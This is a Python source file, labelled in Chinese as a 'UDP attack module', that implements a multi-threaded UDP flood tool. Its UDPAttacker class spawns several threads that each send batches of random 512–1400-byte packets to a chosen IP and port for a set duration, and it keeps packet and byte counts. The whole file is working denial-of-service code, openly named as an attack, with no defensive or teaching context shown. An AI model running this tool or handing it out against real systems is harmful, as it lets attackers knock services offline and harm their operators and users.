#!/usr/bin/env python3
"""
UDP攻击模块
"""

import socket
import threading
import time
import random

class UDPAttacker:
    def __init__(self, target_ip, target_port=9999, num_threads=10, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.total_packets = 0
        self.total_bytes = 0
        self.lock = threading.Lock()
        self.attacking = False
    
    def _generate_payload(self, size=1024):
        """生成随机payload"""
        return bytes(random.getrandbits(8) for _ in range(size))
    
    def _attack_thread(self, thread_id):
        """攻击线程"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packet_count = 0
        bytes_sent = 0
        start_time = time.time()
        end_time = start_time + self.duration
        
        # 预生成payload
        payloads = [self._generate_payload(random.randint(512, 1400)) for _ in range(10)]
        
        try:
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    # 批量发送
                    for _ in range(100):
                        payload = payloads[packet_count % 10]
                        sock.sendto(payload, (self.target_ip, self.target_port))
                        packet_count += 1
                        bytes_sent += len(payload)
                    
                    # 实时更新统计（每1000个包更新一次）
                    if packet_count % 1000 == 0:
                        with self.lock:
                            self.total_packets += 1000
                            self.total_bytes += bytes_sent
                            bytes_sent = 0  # 重置本地计数
                    
                except Exception:
                    continue
        
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            # 更新剩余的统计
            remaining_packets = packet_count % 1000
            with self.lock:
                self.total_packets += remaining_packets
                self.total_bytes += bytes_sent
    
    def start(self):
        """启动攻击"""
        self.attacking = True
        self.stop_event.clear()
        threads = []
        
        for i in range(self.num_threads):
            t = threading.Thread(target=self._attack_thread, args=(i+1,), daemon=True)
            t.start()
            threads.append(t)
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        self.attacking = False
    
    def stop(self):
        """停止攻击"""
        self.stop_event.set()
        self.attacking = False
    
    def is_attacking(self):
        """是否正在攻击"""
        return self.attacking
    
    def get_stats(self):
        """获取统计信息"""
        with self.lock:
            return {
                "packets_sent": self.total_packets,
                "bytes_sent": self.total_bytes
            }
